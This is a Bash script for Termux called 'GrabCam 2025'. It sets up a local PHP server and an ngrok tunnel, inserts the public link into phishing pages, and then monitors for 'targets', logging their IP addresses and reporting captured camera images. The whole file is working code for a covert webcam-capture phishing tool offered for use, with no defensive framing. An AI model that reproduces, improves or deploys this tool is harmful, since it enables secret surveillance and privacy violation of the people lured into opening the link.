#!/data/data/com.termux/files/usr/bin/bash

clear

# ==========================
#  GRABCAM 2025 (Termux)
#  Clean | Fast | Ngrok v3
# ==========================

banner() {
    clear
    echo -e "\033[1;92m
   ██████╗ ██████╗  █████╗ ██████╗  ██████╗ █████╗ ███╗   ███╗
  ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║
  ██║  ███╗██████╔╝███████║██████╔╝██║     ███████║██╔████╔██║
  ██║   ██║██╔══██╗██╔══██║██╔══██╗██║     ██╔══██║██║╚██╔╝██║
  ╚██████╔╝██║  ██║██║  ██║██║  ██║╚██████╗██║  ██║██║ ╚═╝ ██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
    \033[0m"
    echo "                GrabCam 2025 — Termux Edition"
    echo
}

dependencies() {
    pkg install php curl wget unzip -y > /dev/null 2>&1
}

start_php() {
    killall php > /dev/null 2>&1
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
}

start_ngrok() {
    killall ngrok > /dev/null 2>&1
    ngrok http 3333 > /dev/null 2>&1 &
    sleep 7
}

get_link() {
    link=$(curl -s http://127.0.0.1:4040/api/tunnels \
        | grep -o "https://[a-zA-Z0-9.-]*\.ngrok-free.app")

    if [[ -z "$link" ]]; then
        echo "[!] Ngrok failed. Turn on hotspot or switch network."
        exit 1
    fi

    echo "[+] Public Link:"
    echo "$link"
    echo

    sed -i "s|forwarding_link|$link|g" grabcam.html
    sed -i "s|forwarding_link|$link|g" template.php
}

monitor() {
    echo "[*] Waiting for targets..."
    echo "    Press Ctrl+C to stop."
    echo

    while true; do
        if [[ -e ip.txt ]]; then
            echo "[+] Target IP logged!"
            cat ip.txt >> saved_ip.txt
            rm ip.txt
        fi

        if [[ -e image.txt ]]; then
            echo "[+] Camera file received!"
            rm image.txt
        fi
        sleep 1
    done
}

main() {
    banner
    dependencies
    start_php
    start_ngrok
    get_link
    monitor
}

main
